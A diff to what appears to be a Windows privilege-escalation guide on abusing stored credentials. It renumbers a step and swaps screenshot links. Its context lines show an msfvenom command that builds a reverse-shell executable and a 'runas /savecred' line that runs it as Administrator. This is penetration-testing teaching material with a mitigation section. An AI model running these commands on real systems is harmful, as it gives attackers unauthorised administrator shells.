@@ -89,13 +89,9 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > nikos.e
 runas /savecred /user:WORKGROUP\Administrator "C:\Windows\Tasks\nikos.exe"
 ```
 
-Outcome:
+5) Verify the new reverse shell from your attacking machine:
 
-![Stored-Creds-Exploitation-Victim-Side](/Pictures/Stored-Creds-Explotation-1.png)
-
-6) Verify the new reverse shell from your attacking machine:
-
-![Stored-Creds-Exploitation-Attacker-Side](/Pictures/Stored-Creds-Exploitation-2.png)
+![Stored-Creds-Exploitation-Attacker-Side](/Pictures/Stored-Creds-Exploitation-3.png)
 
 ## Mitigation
 
